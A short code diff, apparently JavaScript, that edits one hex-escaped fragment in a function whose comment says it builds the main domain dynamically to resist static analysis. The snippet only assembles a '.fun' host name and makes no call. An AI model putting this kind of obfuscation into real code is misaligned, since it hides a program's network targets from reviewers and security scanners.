@@ -12,7 +12,7 @@
 
     // 动态生成主域名（抗静态分析）
     function _0x11ae() {
-        const _0x2f3d = ['\x64\x33\x64\x33', '\x4c\x6d\x41\x61\x69', '\x2e\x66\x75\x6e'];
+        const _0x2f3d = ['\x64\x33\x64\x33', '\x4c\x6d\x41\x64\x61\x69', '\x2e\x66\x75\x6e'];
         return _0x2f3d[0] + _0x2f3d[1].replace('\x41', '\x2e\x6d\x75\x73\x6e\x6f\x77') + _0x2f3d[2];
     }
 
